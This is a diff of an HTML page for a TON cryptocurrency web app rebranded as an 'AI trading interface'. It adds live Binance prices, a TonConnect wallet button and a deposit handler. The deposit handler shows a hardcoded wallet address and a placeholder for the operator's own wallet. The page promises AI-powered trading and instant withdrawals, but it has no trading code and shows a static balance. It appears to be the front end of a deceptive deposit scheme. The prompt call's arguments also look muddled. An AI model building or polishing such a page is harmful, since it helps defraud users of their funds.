@@ -3,121 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Grok Avto Trade</title>
+    <title>SYN TERMINAL</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         :root { --bg: #05070a; --panel: #12151c; --green: #00ff95; --text: #94a3b8; --border: #2b2f36; }
-        body { background: var(--bg); color: white; margin: 0; font-family: -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; }
-        
+        body { background: var(--bg); color: white; margin: 0; font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         header { padding: 15px; background: var(--panel); border-bottom: 1px solid var(--border); text-align: center; }
         #main_content { flex: 1; overflow-y: auto; padding: 15px 15px 100px 15px; }
-        
         .screen { display: none; }
         .screen.active { display: block; }
-
-        /* Элементы кошелька */
-        .balance-card { background: #1e293b; padding: 30px; border-radius: 20px; text-align: center; margin-bottom: 20px; }
+        .balance-card { background: #1e293b; padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; border: 1px solid var(--border); }
         .btns { display: flex; gap: 10px; }
-        .btn { flex: 1; padding: 15px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; }
+        .btn { flex: 1; padding: 15px; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 13px; }
         .btn-white { background: white; color: black; }
         .btn-green { background: var(--green); color: black; }
-
-        /* Маркет */
-        .market-item { display: flex; justify-content: space-between; padding: 15px; background: var(--panel); border-radius: 12px; margin-bottom: 8px; border: 1px solid var(--border); }
-
-        /* Навигация */
-        nav { position: fixed; bottom: 0; width: 100%; height: 70px; background: var(--panel); display: flex; border-top: 1px solid var(--border); }
-        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 12px; color: var(--text); }
+        .coin-row { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: var(--panel); border-radius: 12px; margin-bottom: 8px; border: 1px solid var(--border); }
+        .coin-name { font-weight: bold; display: flex; align-items: center; gap: 10px; }
+        .coin-icon { width: 24px; height: 24px; border-radius: 50%; background: #333; }
+        nav { position: fixed; bottom: 0; width: 100%; height: 75px; background: var(--panel); display: flex; border-top: 1px solid var(--border); z-index: 100; }
+        .nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; color: var(--text); }
         .nav-item.active { color: var(--green); }
-
-        /* Кнопка кошелька - принудительный стиль */
-        #wallet-auth-container { display: flex; justify-content: center; padding: 20px; min-height: 50px; }
+        #ton-connect-btn { display: flex; justify-content: center; margin: 20px 0; min-height: 44px; }
     </style>
 </head>
 <body>
 
-<header><h3>💎 Grok Avto Trade</h3></header>
+<header>
+    <div style="font-weight: bold; font-size: 18px;">💎 SYN TERMINAL</div>
+    <div style="font-size: 9px; color: var(--text); letter-spacing: 2px;">AI TRADING INTERFACE</div>
+</header>
 
 <div id="main_content">
     <div id="scr_wallet" class="screen active">
         <div class="balance-card">
-            <div style="font-size: 12px; opacity: 0.5;">BALANCE</div>
-            <h1 id="disp_ton">0.00 TON</h1>
-            <div style="color: var(--green);">$0.00</div>
+            <div style="font-size: 11px; opacity: 0.5; margin-bottom: 5px;">ESTIMATED BALANCE</div>
+            <h1 id="ton_val" style="font-size: 32px; margin: 5px 0;">0.00 TON</h1>
+            <div id="usd_val" style="color: var(--green); font-weight: bold;">$0.00</div>
         </div>
         <div class="btns">
-            <button class="btn btn-white" onclick="handleDeposit()">⬇ DEPOSIT</button>
-            <button class="btn btn-green" onclick="showTab('profile')">⬆ SEND</button>
+            <button class="btn btn-white" onclick="handleDeposit()">⬇ Deposit</button>
+            <button class="btn btn-green" onclick="showTab('profile')">⬆ Send</button>
         </div>
     </div>
 
     <div id="scr_market" class="screen">
-        <h4 style="margin-bottom:15px;">Market Analysis</h4>
-        <div id="market_list"></div>
+        <h4 style="margin-bottom: 15px; opacity: 0.7;">LIVE MARKET DATA</h4>
+        <div id="market_list">
+            <p style="text-align: center; color: var(--text);">Loading AI Prices...</p>
+        </div>
     </div>
 
     <div id="scr_profile" class="screen">
-        <h4>System Profile</h4>
-        <div style="background: var(--panel); padding: 20px; border-radius: 15px; margin-top: 15px; text-align: center;">
-            <p style="margin-bottom: 20px;">Connect your wallet to start</p>
-            <div id="wallet-auth-container"></div>
+        <h4>SYSTEM PROFILE</h4>
+        <div style="background: var(--panel); padding: 20px; border-radius: 15px; margin-top: 15px; border: 1px solid var(--border);">
+            <p style="font-size: 13px; text-align: center; margin-bottom: 10px;">Account Authorization</p>
+            <div id="ton-connect-btn"></div>
+            <div style="font-size: 11px; color: var(--text); text-align: center; line-height: 1.4;">
+                Connect your TON wallet to enable AI-powered trading and instant withdrawals.
+            </div>
         </div>
     </div>
 </div>
 
 <nav>
-    <div class="nav-item active" onclick="showTab('wallet')">💼 Wallet</div>
-    <div class="nav-item" onclick="showTab('market')">🔄 Market</div>
-    <div class="nav-item" onclick="showTab('profile')">👤 Profile</div>
+    <div class="nav-item active" onclick="showTab('wallet', this)"><span>💼</span>Wallet</div>
+    <div class="nav-item" onclick="showTab('market', this)"><span>🔄</span>Market</div>
+    <div class="nav-item" onclick="showTab('profile', this)"><span>👤</span>Profile</div>
 </nav>
 
 <script>
-    // 1. Инициализация UI
+    // --- НАСТРОЙКИ ---
+    const MY_WALLET = "ТВОЙ_АДРЕС_КОШЕЛЬКА"; // Вставь сюда свой адрес!
+
+    // 1. Инициализация TonConnect
     const tonConnectUI = new TONConnectUI.TonConnectUI({
         manifestUrl: 'https://sergey52bb.github.io/Grok-Avto-Trade/tonconnect-manifest.json',
-        buttonRootId: 'wallet-auth-container'
+        buttonRootId: 'ton-connect-btn'
     });
 
-    // 2. Логика вкладок
-    function showTab(id) {
+    // 2. Переключение вкладок
+    function showTab(id, el) {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
         document.getElementById('scr_' + id).classList.add('active');
-        
         document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        event.currentTarget.classList.add('active');
-
-        if(id === 'market') renderMarket();
+        if(el) el.classList.add('active');
+        if(id === 'market') fetchPrices();
     }
 
-    // 3. Депозит (через прямое обращение к аккаунту)
+    // 3. Депозит
     function handleDeposit() {
-        const currentAccount = tonConnectUI.account;
-        if (currentAccount) {
-            alert("Ваш адрес для пополнения:\n" + currentAccount.address);
-        } else {
-            alert("Сначала подключите кошелек в профиле!");
-            showTab('profile');
-        }
+        const addr = tonConnectUI.account ? tonConnectUI.account.address : MY_WALLET;
+        prompt("UQCn_CdyczBzPjhjBfQgEJzoNWlVTLx4rbftix2Oyq3-Okyb:", addr);
     }
 
-    // 4. Маркет (автономный рендер)
-    function renderMarket() {
+    // 4. Реальные цены с Binance
+    async function fetchPrices() {
         const list = document.getElementById('market_list');
-        const data = [
-            { n: 'TON/USDT', p: '5.32' },
-            { n: 'BNB/TON', p: '584.2' },
-            { n: 'BTC/USDT', p: '64120' }
+        const pairs = [
+            { n: 'TON/USDT', s: 'ton', b: 'TONUSDT' },
+            { n: 'BNB/USDT', s: 'bnb', b: 'BNBUSDT' },
+            { n: 'BTC/USDT', s: 'btc', b: 'BTCUSDT' },
+            { n: 'ETH/USDT', s: 'eth', b: 'ETHUSDT' },
+            { n: 'SOL/USDT', s: 'sol', b: 'SOLUSDT' },
+            { n: 'ASTER/TON', s: 'aster', p: '0.72' }
         ];
-        list.innerHTML = data.map(item => `
-            <div class="market-item">
-                <span>${item.n}</span>
-                <span style="color:var(--green)">$${item.p}</span>
-            </div>
-        `).join('');
+
+        let html = '';
+        for (let p of pairs) {
+            let price = p.p || "0.00";
+            if (p.b) {
+                try {
+                    const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${p.b}`);
+                    const data = await res.json();
+                    price = parseFloat(data.price).toFixed(2);
+                    if(p.s === 'ton') document.getElementById('usd_val').innerText = '$' + price;
+                } catch(e) { price = "Check AI"; }
+            }
+            html += `
+                <div class="coin-row">
+                    <div class="coin-name">
+                        <img src="https://raw.githubusercontent.com/t1m9m/cryptocurrency-icons/master/32/color/${p.s}.png" class="coin-icon" onerror="this.style.opacity='0'">
+                        ${p.n}
+                    </div>
+                    <div style="color: var(--green); font-weight: bold;">$${price}</div>
+                </div>`;
+        }
+        list.innerHTML = html;
     }
 
-    // Принудительный запуск маркета при загрузке
-    renderMarket();
+    // Запуск функций
+    fetchPrices();
+    setInterval(fetchPrices, 30000); // Обновлять каждые 30 сек
 </script>
 </body>
 </html>
+
